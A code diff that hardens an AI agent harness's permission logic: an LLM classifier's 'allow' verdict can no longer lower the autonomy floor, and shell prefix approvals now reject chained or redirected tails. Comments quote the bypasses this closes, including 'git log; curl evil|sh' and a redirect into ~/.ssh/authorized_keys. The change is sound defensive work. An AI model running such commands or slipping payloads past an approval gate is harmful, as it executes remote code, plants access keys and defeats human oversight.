@@ -329,6 +329,12 @@ export class AgentLoop {
       }
 
       // Execute tool calls (parallel when configured); collect results into one user turn.
+      // Forward progress: the model emitted VALID tool calls, so reset the malformed-call counters — a
+      // transient repair/retry earlier in a long run must not accumulate toward the fatal cap. This makes
+      // MAX_REPAIR_ATTEMPTS bound CONSECUTIVE failures (matching the loop guard) rather than lifetime ones,
+      // which otherwise kills healthy long sessions on flaky local/quantized models — the harness's target.
+      this.repairAttempts = 0;
+      this.toolUseRetries = 0;
       bus.emit({ type: 'mode', mode: 'acting' });
       const resultBlocks: ContentBlock[] = [];
       // Images a tool (view_image) loaded this turn — appended AFTER all tool_result blocks
@@ -385,6 +391,10 @@ export class AgentLoop {
       if (turnImages.length > 0) resultBlocks.push(...turnImages);
       context.append({ role: 'user', content: resultBlocks });
 
+      // A deliberate ESC/Ctrl-C during SERIAL tool execution surfaces as `fatal` (runCalls early-abort at
+      // line 341). Report it as the user's interrupt, not a tool error, so the stop event/hook + telemetry
+      // are correct (the parallel path already re-checks aborted at the top of the loop).
+      if (fatal && this.deps.signal.aborted) return this.stop('interrupted', finalAnswer);
       if (fatal) return this.stop('fatal_tool_error', finalAnswer);
 
       const stop2 = budget.check(this.now());
@@ -716,8 +726,8 @@ export class AgentLoop {
       };
     }
 
-    // Optional rule-based classifier stub (gated by autoClassifier config).
-    let classifierAllow = false;
+    // Optional LLM classifier (gated by autoClassifier config). It may only RAISE caution — hard_deny
+    // blocks, soft_deny asks; an `allow` verdict is a no-op (it can never lower the autonomy floor).
     let classifierAsk = false;
     let classifierReason = '';
     if (this.deps.autoClassifier) {
@@ -736,7 +746,7 @@ export class AgentLoop {
           isFatal: false,
         };
       }
-      if (verdict.verdict === 'allow') classifierAllow = true;
+      // 'allow' is intentionally a no-op — the classifier cannot lower the autonomy floor.
       if (verdict.verdict === 'soft_deny') {
         classifierAsk = true;
         classifierReason = verdict.reason;
@@ -765,15 +775,19 @@ export class AgentLoop {
     const sessionApproved = this.isSessionApproved(call, preview);
     if (
       // A non-null `forced` (catastrophic denylist) ALWAYS gates — no session
-      // approval, classifier `allow`, rule `allow`, or bash-read-only fast path
-      // may bypass it. The denylist is the one rule that does not bend.
+      // approval, rule `allow`, or bash-read-only fast path may bypass it. The
+      // denylist is the one rule that does not bend.
       forced ||
+      // Autonomy is a HARD FLOOR. When the autonomy level requires confirmation for this risk we gate,
+      // unless a DETERMINISTIC / USER-CONFIGURED override applies: a session/prefix approval, a plan-mode
+      // grant, a permission-rule `allow`, or the read-only-shell fast path. The LLM classifier — which is
+      // attacker-influenceable via the tool preview — may only RAISE the bar (soft_deny→ask / hard_deny),
+      // NEVER lower it: a classifier `allow` no longer suppresses the floor (that was a manual-mode bypass).
       (!sessionApproved &&
         !planExitApproved &&
         !planWriteAllowed &&
         !planReadLikeAllowed &&
         !ruleAllow &&
-        !classifierAllow &&
         !bashReadOnlyAllow &&
         (ruleAsk || classifierAsk || needsApproval(tool.risk, this.autonomy)))
     ) {
@@ -993,7 +1007,16 @@ export class AgentLoop {
     if (call.name === 'run_shell') {
       const cmd = shellCommandOf(call.input) ?? preview;
       for (const prefix of this.sessionPrefixApprovals) {
-        if (cmd.startsWith(prefix)) return true;
+        if (!cmd.startsWith(prefix)) continue;
+        const tail = cmd.slice(prefix.length);
+        // Honor a session prefix approval ONLY if the remainder is a plain continuation of the SAME
+        // command (more args/flags) — NOT a chained/redirected/substituted/backgrounded payload. A bare
+        // startsWith let `git log; curl evil|sh` or `git log > ~/.ssh/authorized_keys` auto-run under an
+        // approval of `git log`. Require a word boundary after the prefix and reject any shell
+        // metacharacter in the tail; anything else falls through and re-gates (the user can re-approve).
+        if ((tail === '' || /^\s/.test(tail)) && !/[;&|<>`\n]/.test(tail) && !tail.includes('$(')) {
+          return true;
+        }
       }
     }
     return false;
